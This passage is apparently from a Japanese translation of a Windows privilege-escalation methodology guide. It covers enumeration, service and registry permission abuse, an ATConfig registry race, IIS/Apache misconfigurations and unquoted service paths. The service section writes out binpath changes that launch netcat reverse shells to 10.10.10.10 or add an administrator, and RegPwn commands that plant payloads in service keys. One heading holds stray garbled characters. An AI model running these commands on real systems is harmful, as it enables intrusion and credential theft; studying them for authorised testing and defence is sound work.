msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性の exploit には、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### 監査設定

これらの設定によって何が**ログ記録されるか**が決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding では、ログがどこに送信されるかを確認すると役立ちます。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** は、ドメインに参加しているコンピューターの**ローカル Administrator パスワードを管理**し、各パスワードが**固有で、ランダムに生成され、定期的に更新される**ように設計されています。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest)。

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** から、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスによるメモリの**読み取り**やコードの挿入を**ブロック**して、システムのセキュリティをさらに高めました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた認証情報

**ドメイン認証情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン認証情報が確立されます。\
[**キャッシュされた認証情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループの中に、興味深い権限を持つものがないか確認しましょう。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループについて、また権限昇格のために悪用する方法については、こちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について詳しく学べます：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページで、**興味深いtoken**とその悪用方法について学んでください。


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッションқәа

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示する際に、プロセスのコマンドライン内にパスワードがないか**確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できるか調べます。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

実行中の[**electron/cef/chromium debuggers**がないか常に確認してください。悪用して権限昇格できる可能性があります](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

debugger listenerは短時間しか存在しないことがあるため、ある時点で取得したパッシブなポートスナップショットに表示されなかったからといって、これまで公開されていなかった証拠にはなりません。観測したlistenerがあれば、そのPID、プロセスの所有者、権限の低いユーザーからアクセス可能かどうかを照合してください。アプリケーション名やdebug flagだけでは、ユーザーをまたいだコード実行が可能だとは判断できません。通常の列挙はパッシブに行い、debuggerコマンドは送信しないでください。

**プロセスのバイナリのアクセス権を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリが置かれたフォルダーのアクセス許可を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor ディレクトリ

Snort 2 は、`snort.exe -c <config>` で選択した設定ファイルで宣言されている `dynamicpreprocessor directory` から共有ライブラリを読み込めます。別のアカウントで Snort を実行するスケジュールタスクやサービスの場合は、その設定ファイルと宣言されたモジュールディレクトリの ACL を確認してください。自分のトークンでその場所にファイルを作成できる場合、次にタスクまたはサービスがモジュールを読み込む際のコード実行につながる可能性があるため、調査候補となります。実行アカウントの実効権限、有効な設定、モジュールの互換性、拒否設定や共有制限を確認してください。ディレクトリが書き込み可能なだけでは、権限昇格の根拠にはなりません。[Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) では、実行時のモジュール読み込みについて説明しています。

### 書き込み可能なドキュメントルートを持つ特権 Web サービス

Windows の Apache インストールでは、サービスの実行ファイルのパスと実行アカウントを、有効な `httpd.conf` の `DocumentRoot` と照合してください。一般的な XAMPP の構成では、`C:\xampp\apache\conf\httpd.conf` と、設定されているドキュメントルート（多くの場合 `C:\xampp\htdocs`）の ACL を確認します。Apache が `LocalSystem` として実行されている間に、低い権限のユーザーがそのルートにファイルを作成できる場合、サーバーサイドコードの実行によってホストの権限境界を越えられる可能性があります。サービスが実行中であること、該当のパスが実際に公開されていること、サーバーサイドのハンドラーがそのファイル形式を処理することを確認してください。ルートへの書き込みが可能なだけでは、ファイルを作成できることしか証明できません。プローブを書き込まずに ACL を確認します。

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

従来型の WAMP インストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit の構成では `C:\wamp\...`）を指定し、その隣の `conf\httpd.conf` に設定ファイルがあり、デフォルトのルートが `C:\wamp64\www` または `C:\wamp\www` である場合があります。サービスの正確なイメージ、実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や仮想ホストによる上書きを含む）、ルートの ACL を併せて確認してください。WAMP ディレクトリが書き込み可能でも、Apache が `SYSTEM` として実行されることや、配置したファイルを実行することの証明にはなりません。[Apache のドキュメントでは、Windows サービスが設定を選択する方法が説明されています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワーク ID

IIS では、書き込み可能な物理ディレクトリを `applicationHost.config` 内の**有効なサイト／アプリケーション**に対応付け、その構成済みプールとサーバー側ハンドラーを特定してください。提供ディレクトリに置いたコードがプールとして実行されるのは、IIS がそのファイル形式を処理し、ルートに到達できる場合に限られます。書き込み可能なディレクトリをコード実行と見なす前に、現在のユーザーの実効ファイル作成権限、サイトの実行状態、ハンドラー、パスごとの上書き設定を確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認する必要があります。デフォルトでは、該当する .NET Framework インストール配下の `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft は場所とアプリケーションごとのサブディレクトリについて説明しています](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)。また、アプリケーションプール同士が互いを信頼しない場合、[コンパイルディレクトリを分離することを推奨しています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低い権限のトークンで**特定の**アプリケーションのキャッシュ内にある生成ソースを変更できる場合、そのアプリケーションが、より高い権限の[ワーカープロセス ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするかどうかを確認してください。ファイルやディレクトリの ACL だけではコード実行の証明になりません。キャッシュを有効なアプリケーション、実効トークンと ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングと照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを誘発したり、キャッシュファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` として構成された IIS プールは、ローカルのトークンが低い権限であっても、通常は**ホストコンピューターアカウント**としてドメインリソースに認証します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。一方、`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` プールは、構成されたアカウントを使用します。[Microsoft はこれらの ID タイプ](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)について説明しています。ID 設定が省略されている場合、プールのデフォルト設定を継承することがあり、その設定は IIS の世代によって異なるため、プール名から推測せず、実効設定を確認してください。コンピューターアカウントのネットワーク ID を持つプールでコード実行に至る場合は、**その特定のコンピューター**のディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) にはドメイン命名コンテキストに対するレプリケーション権限が必要です。マシンアカウントのチケットやホストの役割だけでは、その権限の証明になりません。受動的な列挙では、ファイルのアップロード、ネットワーク認証、チケット要求を行わずに、設定と ACL を確認してください。

ヘルパープロセスを起動する読み取り可能な ASP.NET ハンドラーについては、リクエスト由来の値が認証、復号、検証、コマンド構築を経てどう処理されるかを追跡してください。デコードしたトークンを `ProcessStartInfo("cmd", "/c ...")` に連結するハンドラーでは、シェルのメタ文字によってコマンドが変更される可能性があります。[Microsoft は `cmd` の特殊文字について説明しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない呼び出し元が実際にデコード後の値に影響を与えられ、ハンドラーに到達できることを確認したうえで、実効アプリケーションプール ID または偽装 ID と、子プロセスの ID を特定してください。ソースコードの一行、localhost のリスナー、トークン形式の弱点だけでは、特権コマンド実行の証明になりません。受動的な列挙中は、偽造リクエストを送信したりヘルパーを実行したりせずに、ソースとプール設定を確認してください。

Windows 上の PHP サービスでは、リクエストによって制御されるパスが [`include` または `require`](https://www.php.net/manual/en/function.include.php) に渡されると、低い権限のユーザーが書き込み可能な PHP ファイルがワーカーの ID で評価される可能性があります。リクエストがその処理に到達できること、解決後のパスが低い権限のユーザーには変更可能でワーカーには読み取り可能なファイルを指すこと、適用される PHP パス制限で include が許可されること、ワーカーが実際により高い権限で実行されることを確認してください。ループバックのリスナーや書き込み可能なファイルだけでは、この一連の条件の証明になりません。受動的な列挙中はエンドポイントを呼び出さずに、ソース、サービス ID、ファイル ACL を確認してください。

### メモリからのパスワード調査

sysinternals の **procdump** を使用すると、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスでは、**資格情報がメモリ内に平文で保存されている**ことがあります。メモリをダンプして資格情報を読み取ってみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

### 特権コンテキストでのプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウントで入力の信頼境界を越えます。**正確な書き込み可能パス**、それを開くプロセスまたはタスク、その実効 ID、パーサーのビルドを確認してください。[過去の Ghidra のプロジェクトを開く／復元する際の問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトのメタデータに XML external entity を含めることができました。Windows 上でネットワークエンティティを指定すると、[アウトバウンド SMB と NTLM のポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)が許可する場合、インポートアカウントによる認証が発生する可能性があります。これは認証情報漏えいの調査材料であり、ただちに管理者アクセスが得られるわけではありません。応答を利用するには、別の認可済みまたは脆弱な経路が必要であり、現行ビルドについては実際のパッチ適用状態を確認する必要があります。パッシブな列挙中に細工したプロジェクトを開かないでください。インポートのワークフローと ACL を調査してください。

## サービス

Service Control Manager（SCM）オブジェクトの[`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存サービスに対する権限とは別です。この権限を指定した読み取り専用の[`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、それは調査材料であり、新しいサービスを実行できる証拠ではありません。[`CreateService` はハンドルを返し](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)、作成時に要求されたサービスアクセス権がそのハンドルに付与されます。後からサービスを再オープンすると別途アクセスチェックが行われ、元のハンドルを使用できる場合でも失敗することがあります。実効ローカルまたはリモートトークン、許可されたハンドル権限、サービスアカウント、開始ポリシー、実行ファイルパスをそれぞれ確認してください。パッシブな列挙中にサービスを作成または開始しないでください。

リモートでのサービスインストール経路については、対象上の共有に対する SCM 権限を、**同じネットワークログオン**でその共有に書き込めるか、基になる NTFS ACL、そしてサービスアカウントが実行できるローカル実行ファイルパスと照合してください。通常より広い SCM 権限とファイル配置経路の両方が存在すれば、非管理者アカウントでもこの境界を越えられる可能性があります。管理共有は必須ではありません。共有への書き込み権限だけ、あるいは SCM のサービス作成権限だけでは、新しいサービスをより高い ID で開始できるとは限りません。

既存のサービスは、ヘルパーが `ImagePath` に記載されていなくても、起動時、シャットダウン時、または別のライフサイクルイベントでヘルパー実行ファイルを呼び出す場合があります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリに解決され、サービスがより高い ID で実行される場合、ヘルパーファイルが存在しないことは、条件付きで置き換え候補となります。**実際のサービスコードまたは文書化されたヘルパーの呼び出し**、解決される実行ファイルのパスと検索順序、ディレクトリ作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることや、ファイルが存在しないことだけでは、サービスがそのファイルを読み込むとは限りません。パッシブな調査ではサービスを開始または停止しないでください。

既存のサービスでは、[`SERVICE_START` により `StartService` に引数を指定できます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは[`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)とは異なります。開始権限を単なる制御権以上のものと見なす前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使用する場合は、サービス ID、引数から書き込みに至る正確なフロー、パス制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーが存在する場合に限られます。書き込み可能なログや開始権限だけでは不十分です。パッシブなインベントリ調査では、サービスを開始したりテストファイルを作成したりしないでください。

NSClient++ 監視エージェントについては、読み取り可能な `nsclient.ini` は**設定を確認する手がかり**です。Web 認証情報が含まれている場合があり、`boot.ini` によって設定の参照先が別の場所に変更されていることもあります。実際のサービスアカウント、WEB リスナーとアクセス制御ポリシー、認証済みロールで設定やスクリプトを変更できるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または他の有効な実行経路）、コマンドを登録または変更する実効権限、それをサービス ID で実行するトリガーが必要です。ループバックのみを待ち受けるリスナーでも、ローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、リスナーだけではそれらの権限があるとは言えません。パッシブな列挙中は、秘密情報を表示したり Web API を呼び出したりせずに、メタデータと権限を確認してください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web とスクリプトのセキュリティに関するガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` であるサービスでは、実際の実行アカウントと `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を確認してください。[NSSM は子アプリケーションをそこに格納し](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)、`AppDirectory` は設定済みの作業ディレクトリです。ラッパーの権限だけでサービス境界全体を判断する前に、子実行ファイルとその親ディレクトリの ACL を確認してください。その子が公開するローカル WCF または SOAP エンドポイントは、別の調査材料です。低権限ユーザーがリスナーに到達できるか、対象の操作がそのユーザーの入力を受け入れるか、サービスの子プロセスがより高い ID で安全でない操作を実行するかを確認してください。サービスアカウント、エンドポイント URL、書き込み可能なパスだけでは権限昇格の証明になりません。パッシブな列挙中はサービス操作を呼び出さないでください。

カスタム WCF 操作では、呼び出し元が制御できる文字列が PowerShell runspace に渡される経路を追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加し](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)、[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows トランスポート資格情報を使用する `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、その**特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元の入力が、高いサービス ID で実行される `AddScript` に渡される経路は、コード実行の境界です。待ち受けポート、認証済みクライアント、または無関係なアセンブリ内の未使用メソッドだけでは証拠になりません。列挙中にエンドポイントを呼び出さず、デプロイ済みサービス、コントラクト、認可、偽装設定を静的に確認してください。

Service Trigger を使用すると、特定の条件（名前付きパイプ／RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの接続、GPO の更新など）が発生したときに Windows がサービスを開始できます。SERVICE_START 権限がなくても、トリガーを発生させることで特権サービスを開始できる場合があります。列挙とアクティベーションの手法については、こちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio 診断コレクターサービス

C/C++ ツールを含む Visual Studio のインストールには、`LocalSystem` として実行するよう設定された診断サービス `VSStandardCollectorService150` が含まれる場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junction と object-manager-link の競合を利用して、サービスの DACL リセット先を変更しました。実証された権限昇格には、さらに、利用可能な Visual Studio Setup WMI Provider の MSI 修復経路と、そのターゲットである `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` が必要でした。このコンポーネントは 2024 年 1 月に修正されました。

パッシブなトリアージでは、そのサービスのアカウントとバイナリパスを調べ、Setup WMI コンパイラのパスが存在するかを確認し、インストール済みコンポーネントのパッチ適用状態を検証してください。サービスエントリ、Visual Studio 製品のバージョン、またはコンパイラファイルだけでは、ホストが脆弱であるとは言えません。サービスを開始したり修復を実行したりせずに調査できます。

サービスの一覧を取得します：

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

**sc** を使用してサービスの情報を取得できます

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するには、_Sysinternals_ のバイナリ **accesschk** を使用することをお勧めします。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」が変更可能なサービスがあるか確認することをおすすめします。

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP用のaccesschk.exeはこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化

次のエラーが発生した場合（例：SSDPSRV）：

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、関連付けられている有効なデバイスがないため、開始できません。_

次のコマンドで有効化できます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**（XP SP1では）サービス upnphost が動作するには SSDPSRV に依存することに注意してください**

**この問題の別の回避策**は、次を実行することです：

```
sc.exe config usosvc start= auto
```

### **サービスのバイナリパスを変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持つシナリオでは、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動する

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限は、次のようなさまざまなアクセス許可を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: アクセス許可の再構成を可能にし、サービス構成を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得とアクセス許可の再構成を許可します。
- **GENERIC_WRITE**: サービス構成を変更する権限を継承します。
- **GENERIC_ALL**: サービス構成を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_を利用できます。

### サービスバイナリの脆弱なアクセス許可

サービスが**`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントとして実行されていても、**低権限ユーザーがサービスのEXEまたは親フォルダを変更できる場合**、多くの場合、**バイナリを置き換えてサービスを再起動することで**サービスを乗っ取れます。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されているフォルダへの**書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**）。**\
**wmic**（system32にはありません）を使用してサービスによって実行されるすべてのバイナリを取得し、**icacls**を使用してアクセス許可を確認できます。

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

また、**sc** と **icacls**も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探してください。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスのバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または、再起動するかサービスのトリガーが実行されるのを待ちます）。

便利な自動チェック方法:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスが一般ユーザーによる再起動を許可していない場合は、起動時に自動で開始されるか、失敗時のアクションで再起動されるか、またはそのサービスを使用するアプリケーションによって間接的に起動されるかを確認してください。

### サービスのレジストリ変更権限

サービスのレジストリを変更できるか確認してください。\
サービスの**レジストリ**に対する**権限**は、次の方法で**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

元の権限テストでは、次のように述べられていました。

**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持つかどうかを確認します。持っている場合、サービスによって実行されるバイナリを変更できます。

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認してください。ACLエントリがあるだけでは、実効アクセスが証明されるわけではありません。拒否エントリ、現在のトークン、継承された権限も考慮する必要があります。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` 権限および `SERVICE_START` 権限とは別です。権限昇格にはさらに、利用可能なサービス構成フィールド、サービスを起動する方法、より高い権限を持つサービスIDが必要です。Microsoftの[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)および[サービスのアクセス権リファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリのPathを変更するには:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### レジストリのシンボリックリンク競合による任意の HKLM 値書き込み（ATConfig）

一部の Windows アクセシビリティ機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後で **SYSTEM** プロセスによって HKLM のセッションキーにコピーされます。レジストリの **シンボリックリンク競合**を利用すると、この特権書き込みを **任意の HKLM パス**にリダイレクトでき、任意の HKLM **値を書き込む**手段になります。<sup>[[18]](#references)</sup>

主な場所（例：スクリーン キーボード `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、ログオン時やセキュア デスクトップへの遷移時に作成され、ユーザーによる書き込みが可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）：

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. セキュア デスクトップへのコピーをトリガーします（例：**LockWorkstation**）。これにより AT broker の処理が開始されます。
3. **競合に勝ちます**。`C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定します。oplock が発動したら、**HKLM Session ATConfig** キーを、保護された HKLM の対象を指す **レジストリリンク**に置き換えます。
4. SYSTEM が、攻撃者の指定した値をリダイレクト先の HKLM パスに書き込みます。

任意の HKLM 値を書き込めるようになったら、サービス設定値を上書きして LPE に移行します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE / コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが開始できるサービス（例：**`msiserver`**）を選び、書き込み後に起動します。**注：**公開されている exploit の実装では、競合処理の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services レジストリの AppendData/AddSubdirectory 権限

レジストリにこの権限がある場合、**そのレジストリの下にサブレジストリを作成できます**。Windows サービスの場合、**任意のコードを実行するにはこれで十分です:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 引用符で囲まれていないサービスパス

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースまでの各文字列を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて一覧表示します。

```bash
